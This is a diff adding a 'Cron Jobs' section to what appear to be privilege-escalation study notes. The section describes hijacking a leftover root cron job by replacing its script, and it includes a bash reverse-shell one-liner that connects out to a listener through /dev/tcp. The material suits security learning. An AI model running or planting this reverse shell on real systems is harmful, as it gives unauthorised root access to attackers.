@@ -235,9 +235,23 @@ ___
 ### Cron Jobs
 [[#Table of contents|Back to the top]]
 
-*Run scripts/binaries at specific times*
+*Run scripts/binaries at specific times, in realistic environment usually run daily/weekly/monthly*
 
+*Common scenario:*
+1. *Sys admins need script running at regularly*
+2. *They create cron job to do this*
+3. *Script becomes useless, they delete it*  
+4. *Cron job isn't deleted*
 
+If task is scheduled to run with root privilege --> attempt to modify script in order for our script to run with root privilege
+
+**`/etc/crontab`:** cron jobs info
+
+--> Change .sh file with reverse shell script and catch it with listener
+```Bash
+#!/bin/sh
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+```
 
 ___
 ### 
